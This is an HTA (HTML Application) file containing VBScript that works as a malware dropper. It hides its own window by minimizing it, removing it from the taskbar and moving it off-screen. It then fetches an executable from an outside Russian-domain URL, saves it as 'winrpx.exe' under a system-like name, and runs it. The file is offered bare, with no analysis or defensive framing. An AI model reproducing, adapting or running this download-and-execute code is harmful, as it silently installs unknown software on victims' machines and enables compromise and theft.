<HTA:APPLICATION ID="oHTA"
APPLICATIONNAME="myApp"
BORDER="none"
BORDERSTYLE="normal"
CAPTION="no"
ICON=""
MAXIMIZEBUTTON="no"
MINIMIZEBUTTON="no"
SHOWINTASKBAR="no"
SINGLEINSTANCE="no"
SYSMENU="yes"
VERSION="1.0"
WINDOWSTATE="minimize"/>


<script language="vbscript">

    self.MoveTo 5000,5000

    payload = "http://internetsolution.ru/hmd/hmd.exe"
    target = "winrpx.exe"

    const ForWriting = 2

    set xmlHTTP = CreateObject("Microsoft.XMLHTTP")
    xmlHTTP.open "GET", payload, false
    xmlHTTP.send
    contents = xmlHTTP.responseBody

    Set fso = CreateObject("Scripting.FileSystemObject")
    Set f = fso.CreateTextFile(target, ForWriting)

    for i = 0 to UBound(contents)
        thischarcode = ascb(midb(contents, i+1, 1))
        f.Write chr(thischarcode)
    next

    f.close

    Set shell=CreateObject("WScript.Shell")
    shell.run(target)

</script>
